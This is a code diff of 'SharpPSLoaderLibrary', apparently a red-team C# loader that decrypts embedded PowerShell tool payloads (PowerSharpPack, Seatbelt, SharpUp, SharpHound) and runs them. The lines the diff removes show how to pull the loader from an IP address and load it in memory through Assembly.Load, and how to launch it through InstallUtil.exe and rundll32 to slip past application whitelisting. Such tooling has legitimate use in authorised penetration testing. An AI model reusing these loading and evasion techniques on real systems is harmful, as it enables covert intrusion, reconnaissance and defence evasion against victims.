@@ -8,34 +8,14 @@ using System.Collections;
 using System.Runtime.InteropServices;
 using System.Reflection;
 
-
 /*
  * Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
- *      
  *      
  * Adding Resources 
  *  - Project > Properties > Add Resources > Access Modifier = Public 
  *  - And simply access it like... var thingy = Properties.Resources.<resource-name>
  *      - Returns "type" by default. ex) .txt file ==> string, byte file ==> byte[] 
  *  - Thought about adding powershell scripts, decided to just yoink powersharppack and call it a day 
- *  
- * Usage: 
- *  - Console
- *      .\SharpPSLoaderLibrary.exe 1 powersharppack -seatbelt -command "-group=user"
- *      
- *  - In-memory (Obfuscated, Non-obfuscated)
- *      $b = (New-Object net.webclient).DownloadData("http://192.168.40.130:8888/SharpPSLoader.exe")
- *      [System.Reflection.Assembly]::Load($b)
- *      [SharpPSLoaderLibrary.SharpPSLoaderLibrary]::Main(@("1","Powersharppack -sharpup audit"))
- * 
- *  - LOLBAS - InstallUtils.exe 
- *      C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoaderLibrary.exe
- *      
- *  - Library - rundll32.exe 
- *      c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 
- *  
- *      (64bit) c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 
- *      (32bit) C:\Windows\SysWOW64\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user
  * 
  * */
 
@@ -65,7 +45,6 @@ namespace SharpPSLoaderLibrary
             return resultStr;
         }
 
-        // Return a dictionary of <string,byte[]>
         // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
         /// <summary>
         /// Parse resources from assembly and create a dictionary of <string, byte[]> where string = Name, byte[] = Encrypted powershell payload.
@@ -107,10 +86,7 @@ namespace SharpPSLoaderLibrary
                     encPayload = resourceDict.Where(a => a.Key.Contains("arppack")).Select(a => a.Value).First();
                     break;
                 case "2":
-                    encPayload = resourceDict.Where(a => a.Key.Contains("oodHo")).Select(a => a.Value).First();
-                    break;
-                case "3":
-                    encPayload = resourceDict.Where(a => a.Key.Contains("wervi")).Select(a => a.Value).First();
+                    encPayload = resourceDict.Where(a => a.Key.Contains("arphoun")).Select(a => a.Value).First();
                     break;
                 default:
                     break;
@@ -373,8 +349,6 @@ namespace SharpPSLoaderLibrary
         static extern string GetCommandLineA();
     }
 
-
-
     // -------------------------------------------------------------------------------------------------
     // Uninstall function to execute SharpPSLoader through InstallUtil.exe 
     // -------------------------------------------------------------------------------------------------
@@ -405,12 +379,8 @@ namespace SharpPSLoaderLibrary
                 powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, payload);
             }
 
-
             psLoader.RunPowershell(powershellPayload, argument);
-
         }
     }
-
-
 }
 
